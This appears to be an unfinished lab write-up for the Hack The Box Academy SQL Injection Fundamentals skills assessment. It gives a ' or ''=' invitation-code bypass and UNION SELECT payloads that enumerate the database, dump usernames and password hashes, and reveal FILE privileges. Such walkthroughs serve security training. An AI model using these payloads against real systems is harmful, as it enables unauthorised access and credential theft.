## Purpose:

This writeup detalis how to solve the Skills Assessment for the SQL Injection Fundamentals module from Hack THe Box Acadmey.

## Getting Started:
After starting the target, and pasting the ip in the browser youll notice that that the page doesnt load.

- You'll need to ignore the SSL Certificate to go to the page.


## Create Account:

Once you are at the webpage click on the "create account" tab navigate to register.php.

- The form will not let you create an account without an "invitation code".

  - However the name="invitationCode" param is vulnerable to an SQL injection.

    - You can bypass the invitationCode requirment with the payload: ' or ''='
   
    - The browser will not let you fillout the form, but using req.py or a proxy like Burp Suite, we can circumvent this restriction and send data to the server.
   
  - Notice that the registration form inclueds the following action param:
   
        <form action="/api/register.php" method="POST" id="registrationForm">

      We will need to send the request to: ip:port/api/register.php

You will have successfully created an account when you see this line in the Responce:

    Location: /login.php?s=account+created+successfully!

Explanation:

- The input is:

      invitationCode=' or ''='

- A likly query is:

      SELECT * FROM invites WHERE code = '$invitationCode

- Leading to:

      SELECT * FROM invites WHERE code = '' OR ''=''

- Note:

  - This exploit also allows us to create accounts with '' as the password, or with missmatched password inputs.

## Exploit:

The "search in conversation" input field uses a GET request to retrieve data from the database. This represents a potential injection point.

- Lets start by determine the number of columns we are working with

  - We can do so with this injection:

        ') UNION SELECT 1,2,3,4-- -

  - This allows us to break out of the original query with ')
  - Then the UNION SELECT aligns the columns
  - The result shows that columns "3" and "4" are displayed, and can be used to leak information

<img width="1282" height="445" alt="chattr1" src="https://github.com/user-attachments/assets/62606693-24af-4058-9f0b-a981d4dbd094" />


- Lets try a basic exploit to find the database name with this injection:

      ') UNION SELECT 1,2,database(),4 FROM INFORMATION_SCHEMA.SCHEMATA #

  - This returns: chattr

<img width="1282" height="445" alt="chattr2" src="https://github.com/user-attachments/assets/705aabe0-e1bc-4fee-acdd-471273234a79" />


- Now lets enumerate the databases and tables, we can do that with:

      ') UNION SELECT 1,2,TABLE_NAME,TABLE_SCHEMA FROM INFORMATION_SCHEMA.TABLES-- -

  - This returns a long list of information but lets focus on 

...

- We can get the password hashes with:

      ') UNION SELECT 1,2,Username,Password FROM chattr.Users-- -

Next, lets see what permissions are avalible with the payload:

    ') UNION SELECT 1,2,GRANTEE,PRIVILEGE_TYPE FROM information_schema.USER_PRIVILEGES-- -

  <------ Include image ------>

- This shows that user 'chattr_dbUser'@'localhost' has "FILE" permissions, meaning that we can read and write files.





